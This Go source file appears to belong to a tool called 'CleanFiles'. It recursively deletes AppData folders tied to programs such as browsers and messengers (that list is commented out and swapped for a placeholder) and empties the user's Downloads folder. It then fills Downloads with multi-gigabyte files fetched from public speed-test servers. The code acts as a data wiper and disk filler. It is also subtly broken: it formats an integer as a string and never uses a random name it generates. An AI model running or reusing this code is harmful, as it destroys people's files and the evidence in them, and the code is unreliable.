package main

import (
	"CleanFiles/logger"
	"fmt"
	"math/rand"
	"os"
	"os/user"
	"strconv"
	"strings"
	"time"
)

func main() {
	var links = []string{
		"http://ipv4.download.thinkbroadband.com/512MB.zip",
		"https://speed.hetzner.de/1GB.bin",
		"http://ipv4.download.thinkbroadband.com/1GB.zip",
		"https://github.com/yourkin/fileupload-fastapi/raw/a85a697cab2f887780b3278059a0dd52847d80f3/tests/data/test-5mb.bin",
		"https://speed.hetzner.de/100MB.bin",
		"https://speed.hetzner.de/1GB.bin",
		"http://speedtest-sgp1.digitalocean.com/5gb.test",
		"https://speed.hetzner.de/10GB.bin"}

	log := logger.New()
	log.Println("starting...")
	defer log.Println("Done!")

	user, errusr := user.Current()
	if errusr != nil {
		log.Println(errusr)
	}
	ctlguser := fmt.Sprintf("C:\\Users\\%s\\Downloads", strings.Split(user.Username, "\\")[1])

	searchProcess(log)

	chann := appdata(log)
	for ctlg := range chann {
		err := os.RemoveAll(ctlg)
		if err != nil {
			log.Println(err)
		}
	}

	chann2 := downloads(log, ctlguser)
	for ctlg := range chann2 {
		err := os.RemoveAll(ctlg)
		if err != nil {
			log.Println(err)
		}
	}

	for i, l := range links {
		rand.Seed(time.Now().UnixNano())
		randname := fmt.Sprintf("%v", strconv.Itoa(rand.Intn(100)))
		createNullFile(log, ctlguser, randname)
		flname := fmt.Sprintf("%s\\%s", ctlguser, i)
		errdown := DownloadFile(flname, l)
		if errdown != nil {
			log.Println(errdown)
		}
	}

	return

}

func containsProgs(x string) bool {
	//var progs = []string{"chrome", "telegram", "opera", "bitrix", "skype", "mozilla", "firefox", "thunderbird", "outlook"}
	var progs = []string{"chddddrome"}
	for _, n := range progs {
		if strings.Contains(strings.ToLower(x), n) {
			return true
		}
	}
	return false
}
